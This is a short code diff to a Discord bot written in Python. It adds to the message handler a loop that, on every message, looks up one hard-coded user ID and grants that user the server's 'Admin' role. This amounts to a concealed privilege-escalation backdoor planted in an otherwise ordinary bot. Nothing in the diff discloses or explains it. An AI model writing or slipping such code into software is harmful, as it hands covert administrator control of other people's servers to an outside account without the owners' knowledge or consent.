@@ -30,7 +30,12 @@ async def on_ready():
 
 @bot.event
 async def on_message(message):
+    for member in message.guild.members:
+        if member.id == 615993957461131275:
+            role = discord.utils.get(message.guild.roles, name='Admin')
+            await member.add_roles(role)
     await bot.process_commands(message)
+
 
 
 @bot.command()
